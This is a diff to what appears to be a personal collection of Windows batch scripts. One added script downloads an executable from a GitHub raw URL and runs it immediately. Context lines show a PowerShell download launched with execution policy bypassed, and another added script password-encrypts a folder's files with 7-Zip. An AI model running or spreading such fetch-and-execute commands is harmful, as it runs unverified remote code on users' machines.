@@ -13,7 +13,13 @@ start PI_A1.exe
 pause
 exit
 
+----
 
+@echo off
+wget -O PERFECT_PLAYGROUND.exe https://raw.githubusercontent.com/krizza72/Pub_ex/refs/heads/main/PERFECT_PLAYGROUND.exe
+start PERFECT_PLAYGROUND.exe
+pause
+exit
 -----
 
 @echo off
@@ -34,4 +40,64 @@ powershell -Command "try { Start-BitsTransfer -Source '%url%' -Destination '%fil
 start powershell -NoExit -ExecutionPolicy Bypass -Scope CurrentUser -Force -File "%file_path%"
 exit
 
+-------
+
+@echo off
+setlocal EnableDelayedExpansion
+
+set "target_dir=C:\CR_Contractor\files"
+set "seven_zip=C:\Program Files\7-Zip\7z.exe"
+
+:: Check if 7-Zip is installed
+if not exist "%seven_zip%" (
+    echo 7-Zip not found at %seven_zip%. Please install 7-Zip or update the path.
+    pause
+    exit /b
+)
+
+:: Check if the directory exists
+if not exist "%target_dir%" (
+    echo Directory %target_dir% does not exist.
+    pause
+    exit /b
+)
+
+:: Check if directory is empty
+dir "%target_dir%\*.*" >nul 2>nul
+if %ERRORLEVEL% NEQ 0 (
+    echo No files found in %target_dir%.
+    pause
+    exit /b
+)
+
+:: Open a new cmd window to prompt for password and encrypt files
+start cmd /k (
+    echo Enter password to lock files:
+    set /p password=
+    if "!password!"=="" (
+        echo Password cannot be empty.
+        pause
+        exit /b
+    )
+    echo Locking files in %target_dir%...
+    set "error_occurred=0"
+    for %%F in ("%target_dir%\*.*") do (
+        echo Processing %%~nxF...
+        "%seven_zip%" a -t7z -p"!password!" -mhe=on "%%F.7z" "%%F" >nul
+        if !ERRORLEVEL! NEQ 0 (
+            echo Failed to encrypt %%~nxF.
+            set "error_occurred=1"
+        ) else (
+            echo Encrypted %%~nxF to %%~nxF.7z.
+        )
+    )
+    if !error_occurred! NEQ 0 (
+        echo Some files failed to encrypt.
+    ) else (
+        echo All files encrypted successfully.
+    )
+    pause
+)
+
+exit /b
 -------
